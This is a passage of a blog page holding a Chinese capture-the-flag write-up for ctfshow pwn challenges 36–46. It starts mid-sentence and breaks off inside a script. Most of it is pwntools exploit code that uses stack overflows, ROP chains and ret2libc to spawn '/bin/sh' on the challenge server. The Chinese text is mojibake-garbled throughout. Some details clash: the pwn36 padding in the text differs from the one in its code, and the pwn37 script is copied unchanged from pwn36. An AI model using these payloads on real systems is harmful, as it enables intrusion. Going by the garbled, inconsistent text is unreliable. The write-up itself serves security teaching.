¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ¬é¢˜æ¶‰åŠä¸åˆ°ï¼Œæ‰€ä»¥å¯¹æœ¬é“é¢˜ä¹Ÿå‡ ä¹é˜»ç¢ä¸å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯sshä¹‹åè¿è¡Œæ–‡ä»¶æ—¶è¾“å…¥çš„4ä¸ªé•¿åº¦ä¸º1çš„å‚æ•°ï¼Œä¸å‡ºæ„å¤–è¿˜èƒ½åˆ°æ‹¿åˆ°flagï¼</p><h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><h3 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h3><p>getså‡½æ•°æ˜¯æ²¡æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œå¯ä»¥å‘ç”Ÿæ ˆæº¢å‡ºï¼</p><p>æ‰€ä»¥æˆ‘ä»¬çš„å¤§è‡´æ€è·¯å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºï¼Œå°†ctfshowå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºget_flagå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œè¿›è€Œæ‹¿åˆ°flagã€‚</p><p>é¦–å…ˆçœ‹idaä¸­s[36]æ•°ç»„çš„å¤§å°ä¸º36ï¼ŒåŠ ä¸Šæˆ‘ä»¬è¿˜è¦è¦†ç›–æ‰ebpçš„å€¼(ebpåé¢æ˜¯è¿”å›åœ°å€ï¼Œå‰é¢æ˜¯å±€éƒ¨å˜é‡sæ•°ç»„çš„æ ˆç©ºé—´)ï¼Œæˆ‘ä»¬éœ€è¦çš„å¡«å……æ•°æ®é•¿åº¦å°±ä¸º36 + 4å³0x28 + 0x4ï¼Œæˆ‘ä»¬é€šè¿‡gdbçš„disass get_flagå‘½ä»¤å°±å¯ä»¥å¾—åˆ°get_flagå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼Œå…¶ä¸­å°±æœ‰get_flagå‡½æ•°çš„é¦–åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§è‡´çš„payloadå°±ä¸ºï¼š(0x28 + 0x4 ) * â€˜aâ€™ + p32(get_flagå‡½æ•°çš„åœ°å€)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h3><h5 id="32ä½çš„-system-â€œ-x2F-bin-x2F-shâ€-åé—¨å‡½æ•°ç»™ä½ "><a href="#32ä½çš„-system-â€œ-x2F-bin-x2F-shâ€-åé—¨å‡½æ•°ç»™ä½ " class="headerlink" title="32ä½çš„ system(â€œ&#x2F;bin&#x2F;shâ€) åé—¨å‡½æ•°ç»™ä½ "></a>32ä½çš„ system(â€œ&#x2F;bin&#x2F;shâ€) åé—¨å‡½æ•°ç»™ä½ </h5><p>ç›´æ¥æ”¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h3><h5 id="æ”¹64ä½"><a href="#æ”¹64ä½" class="headerlink" title="æ”¹64ä½"></a>æ”¹64ä½</h5><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦ç”¨leaå‘½ä»¤çš„åœ°å€ä½œä¸ºè¦†ç›–çš„åœ°å€ï¼Œè€Œä¸æ˜¯backdoorå‡½æ•°çš„åœ°å€ï¼Œæ‰ç–å­¦æµ…ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå¯èƒ½æ˜¯ä¿®æ”¹äº†æ ˆçš„å€¼å¯¼è‡´å‡ºç°é”™è¯¯</p><h3 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h3><h5 id="32ä½çš„-system-â€œ-x2F-bin-x2F-shâ€"><a href="#32ä½çš„-system-â€œ-x2F-bin-x2F-shâ€" class="headerlink" title="32ä½çš„ system(); â€œ&#x2F;bin&#x2F;shâ€"></a>32ä½çš„ system(); â€œ&#x2F;bin&#x2F;shâ€</h5><p>ä½†æ˜¯è¿™é‡Œä¸æ˜¯system(â€œ&#x2F;bin&#x2F;shâ€)äº†ï¼Œè€Œæ˜¯å°†å‡½æ•°å’Œå‚æ•°åˆ†å‰²ï¼Œä¸¤è€…éƒ½åœ¨ç¨‹åºä¸­ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºè‡ªè¡Œæ„é€ å®Œæ•´åé—¨ï¼Œæ ˆä¸Šä¼ å‚</p><p>è‡ªè¡Œæ„é€ å®Œæ•´åé—¨ï¼ˆè°ƒç”¨é“¾ï¼‰å¯¹æº¢å‡ºé•¿åº¦æœ‰è¦æ±‚ï¼Œè‡³å°‘è¦èƒ½æº¢å‡ºé™¤ipä»¥å¤–å†å¤š2ä¸ªæœºå™¨å­—é•¿ï¼ˆ32ä½4 bitï¼›64ä½8bitï¼‰ï¼Œç”¨äºå†™å…¥è°ƒç”¨æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#payload=[å¡«å……]+[system@plt]+[4byteså¡«å……]+[å‚æ•°]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28113&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system_addr = 0x080483A0</span><br><span class="line">binsh_addr = 0x8048750</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h3><h5 id="64ä½çš„-system-â€œ-x2F-bin-x2F-shâ€"><a href="#64ä½çš„-system-â€œ-x2F-bin-x2F-shâ€" class="headerlink" title="64ä½çš„ system(); â€œ&#x2F;bin&#x2F;shâ€"></a>64ä½çš„ system(); â€œ&#x2F;bin&#x2F;shâ€</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28227&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x602080</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(system_addr)+b&#x27;aaaaaaaa&#x27;+p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ¬æ¥ä»¥ä¸ºä¹Ÿæ˜¯æ”¹ä¸€æ”¹å°±å¯ä»¥çš„ï¼Œï¼Œä½†æ˜¯é”™äº†ã€‚ã€‚</p><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹ROPgadgetå·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥ç»•è¿‡NXä¿æŠ¤ï¼Œåœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µï¼ˆgadgetsï¼‰æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p>64ä½æ±‡ç¼–ä¼ å‚ï¼Œå½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ã€‚ å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œå‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚</p><p>æœ‰çš„é¢˜ï¼Œé‡Œé¢æ—¢æ²¡æœ‰ç°æˆçš„systemä¹Ÿæ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æœ‰æä¾›libc.soç»™æˆ‘ä»¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯æƒ³åŠæ³•æ³„éœ²libcåœ°å€ï¼Œæ‹¿åˆ°systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼›æˆ‘ä»¬å°±éœ€è¦è·å–rdi, rsi, rdx, rcx, r8, r9å®ƒä»¬çš„åœ°å€ï¼Œé¦–å…ˆè¦è·å–çš„æ˜¯rdiçš„åœ°å€ã€‚è¿™å°±æ˜¯ ROPgadget çš„ä½œç”¨ã€‚</p><p>å›åˆ°æœ¬é¢˜ï¼Œä¸‹é¢åˆ©ç”¨ROPgadgetè·å¾—rdiçš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure><p>è·å–retçš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#payload=[å¡«å……]+[pop_rdi_ret]+[å‚æ•°]+[system@plt]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28151&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 0x8</span><br><span class="line">ret_addr = 0x00000000004004fe</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">rdi_addr = 0x00000000004007e3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(binsh_addr)  + p64(ret_addr) + p64(system_addr)</span><br><span class="line">#è¿™é‡Œret_addrçš„ä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ª8å­—èŠ‚çš„é—´æ¥è·³è½¬æŒ‡ä»¤ï¼Œç”¨äºç»•è¿‡æ ˆä¸­çš„è¿”å›åœ°å€ï¼Œä»¥è¾¾åˆ°æ‰§è¡Œsystemå‡½æ•°çš„ç›®çš„</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.pwn36-pwn38ï¼šå®Œæ•´åé—¨&amp;æº¢å‡ºé•¿åº¦å¤§äºç­‰äºipã€‚åªè¦æˆ‘ä»¬è°ƒç”¨è¿™ä¸ªåé—¨å‡½æ•°ï¼Œä¸éœ€è¦å…¶ä»–é¢å¤–çš„æ“ä½œå°±èƒ½getshellï¼Œé€šå¸¸æ˜¯system(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œwrite(1,â€™flagâ€™,32)ç­‰å½¢å¼ã€‚</p><p>payload &#x3D; [å¡«å……] + [get_shell_addr]</p><p>2.pwn39ã€wn40ï¼šæ®‹ç¼ºåé—¨&amp;æº¢å‡ºé•¿åº¦è¿œå¤§äºipã€‚è¿™é‡ŒæŒ‡çš„è¿œå¤§äºipï¼Œæ„æ€æ˜¯å¯ä»¥æº¢å‡ºè¦†ç›–é™¤äº†ipä»¥å¤–çš„2ä¸ªä»¥ä¸Šçš„ï¼ˆä¸€èˆ¬æƒ…å†µï¼Œå®é™…æƒ…å†µå®é™…åˆ†æï¼‰æœºå™¨å­—é•¿ã€‚æ®‹ç¼ºåé—¨çš„å½¢å¼å¤šç§å¤šæ ·ï¼šæä¾›è¯¸å¦‚systemç­‰å…³é”®å‡½æ•°ï¼Œflagã€&#x2F;bin&#x2F;shç­‰å­—ç¬¦ä¸²ï¼ŒæŸäº›gadgetç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=[å¡«å……]+[system@plt]+[4bitå¡«å……]+[å‚æ•°]  #32ä½</span><br><span class="line">payload=[å¡«å……]+[pop_rdi_ret]+[å‚æ•°]+[system@plt]  #64ä½</span><br></pre></td></tr></table></figure><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_63576152/article/details/132437169">https://blog.csdn.net/weixin_63576152/article/details/132437169</a></p><h3 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h3><h5 id="32ä½çš„-system-ä½†æ˜¯æ²¡â€-x2F-bin-x2F-shâ€-ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£"><a href="#32ä½çš„-system-ä½†æ˜¯æ²¡â€-x2F-bin-x2F-shâ€-ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£" class="headerlink" title="32ä½çš„ system(); ä½†æ˜¯æ²¡â€&#x2F;bin&#x2F;shâ€  ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£"></a>32ä½çš„ system(); ä½†æ˜¯æ²¡â€&#x2F;bin&#x2F;shâ€  ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£</h5><p>è¿™é‡Œå…ˆä»‹ç»ä¸€ä¸‹&#x2F;bin&#x2F;shå’Œ&#x2F;shçš„åŒºåˆ«ï¼š</p><p>system(â€œ&#x2F;bin&#x2F;shâ€) æ˜¯ç›´æ¥æŒ‡å®šäº†ç³»ç»Ÿé»˜è®¤çš„shellç¨‹åºè·¯å¾„æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç¡®ä¿ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„shellç¨‹åºæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸º &#x2F;bin&#x2F;sh é“¾æ¥é€šå¸¸æŒ‡å‘é»˜è®¤shellçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ system(â€œshâ€) åˆ™ä¼šç›´æ¥å¯åŠ¨ä¸€ä¸ªåä¸ºshçš„shellç¨‹åºï¼Œä¾èµ–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ $PATH æ¥æŸ¥æ‰¾ sh å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ‰§è¡Œã€‚å¦‚æœç³»ç»Ÿçš„ç¯å¢ƒå˜é‡è®¾ç½®æ­£ç¡®ï¼Œè¿™ä¸¤ç§æ–¹å¼æ˜¯ç­‰æ•ˆçš„ï¼›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28297&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system = 0x80483D0</span><br><span class="line">sh = 0x80487BA</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system) + b&#x27;aaaa&#x27; + p32(sh)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28235&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x400560</span><br><span class="line">sh_addr = 0x400872</span><br><span class="line">rdi_addr = 0x400843</span><br><span class="line">ret_addr = 0x40053e</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h3><h5 id="32ä½çš„-system-ä½†æ˜¯å¥½åƒæ²¡â€-x2F-bin-x2F-shâ€-ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•"><a href="#32ä½çš„-system-ä½†æ˜¯å¥½åƒæ²¡â€-x2F-bin-x2F-shâ€-ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•" class="headerlink" title="32ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡â€&#x2F;bin&#x2F;shâ€  ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•"></a>32ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡â€&#x2F;bin&#x2F;shâ€  ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = [å¡«å……] + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + [4byteså¡«å……] +p32(buf2)</span><br><span class="line">#1.å¡«å……åæº¢å‡ºï¼Œæ‰§è¡Œgetså‡½æ•°ï¼Œæ¥æ”¶æ•°æ®</span><br><span class="line">#2.å°†æ•°æ®ä»æ ˆä¸­å¼¹å‡ºå­˜å…¥å¯„å­˜å™¨ebxä¸­</span><br><span class="line">#3.å†ç”¨ç¼“å†²åŒºæŒ‡é’ˆbuf2æŒ‡å‘å¯„å­˜å™¨ebxçš„æ•°æ®</span><br><span class="line">#4.è°ƒç”¨systemå‡½æ•°ï¼Œå‚æ•°ä¸ºbuf2æ‰€æŒ‡æ•°æ®ï¼Œå³getsæ¥æ”¶çš„æ•°æ®</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28280&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x6c + 4</span><br><span class="line">system_addr = 0x8048450</span><br><span class="line">buf2 = 0x804B060</span><br><span class="line">gets = 0x8048420</span><br><span class="line">pop_ebx = 0x08048409</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + b&#x27;aaaa&#x27; +p32(buf2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h3><p>64ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡â€&#x2F;bin&#x2F;shâ€  ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•</p><p>å’Œä¸Šé¢˜ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯64ä½æ²¡æœ‰ebxå¯„å­˜å™¨ï¼Œè¿˜éœ€è¦ç”¨rdiä»£æ›¿ï¼Œå…ˆæ‰¾åˆ°åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28209&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 8</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">buf2 = 0x602080</span><br><span class="line">gets = 0x400530</span><br><span class="line">pop_rdi = 0x4007f3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.åˆ©ç”¨ pop_rdi æŒ‡ä»¤å°† buf2 çš„åœ°å€åŠ è½½åˆ°rdiå¯„å­˜å™¨ä¸­ï¼Œå› ä¸ºåœ¨è°ƒç”¨getså‡½æ•°ä¹‹å‰ï¼Œä½ éœ€è¦å°†è¾“å…¥çš„ç¼“å†²åŒºçš„åœ°å€ï¼ˆå³buf2çš„åœ°å€ï¼‰ä¼ é€’ç»™getså‡½æ•°ï¼Œä»¥ä¾¿getså‡½æ•°çŸ¥é“å°†è¾“å…¥æ•°æ®å­˜å‚¨åœ¨å“ªä¸ªç¼“å†²åŒºä¸­ 2.è°ƒç”¨ gets å‡½æ•°ï¼Œä»¥ buf2 çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œä»ç”¨æˆ·è¾“å…¥ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨buf2ä¸­ 3.å†æ¬¡åˆ©ç”¨ pop_rdi æŒ‡ä»¤å°† buf2 çš„åœ°å€åŠ è½½åˆ°rdi å¯„å­˜å™¨ä¸­ 4.è°ƒç”¨ system å‡½æ•°ï¼Œä»¥ buf2 çš„åœ°å€ä½œä¸ºå‚æ•°</p><h3 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h3><h5 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h5><p>..ã€‚ã€‚æ‰“äº†ä¸€å¤©æ²¡å¤§é€šã€‚ç®—æ–™ã€‚ã€‚</p><p>å‘ƒå‘ƒæ‰“é€šäº†ã€‚ã€‚ã€‚ã€‚ï¼ˆäº”åˆ†é’Ÿåè§‰å¾—æœ‰é—®é¢˜ã€‚ã€‚</p><p>#æ­£è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#right</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28187&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">offset = 0x6B + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got)+ p32(4)</span><br><span class="line">p.recvuntil(&#x27;O.o?&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&quot;write&quot;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h3><p>ï¼Ÿç¥å¥‡ï¼Œå¾—å…ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">readelf -s pwn</span><br><span class="line">objdump -R pwn</span><br></pre></td></tr></table></figure><p>æºœä¸€éï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = 